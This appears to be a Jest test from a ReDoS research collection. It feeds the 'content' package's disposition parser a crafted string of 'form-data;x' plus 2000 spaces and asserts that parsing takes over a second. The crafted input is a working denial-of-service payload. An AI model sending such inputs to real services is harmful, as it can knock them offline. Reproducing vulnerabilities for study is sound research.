//https://github.com/sola-da/ReDoS-vulnerabilities/blob/master/test-content.js
test("ReDos in content", () => {
    const genstr = require("./utils").genstr;
    const measureTime = require("./utils").measureTime;
    const content = require("content");
  
    let t = measureTime(function () {
        content.disposition("form-data;x" + genstr(2000, " "));
    });
    
    
    let time= t[0]+t[1]/1000000000;
    
    expect(time).toBeGreaterThan(1);
  });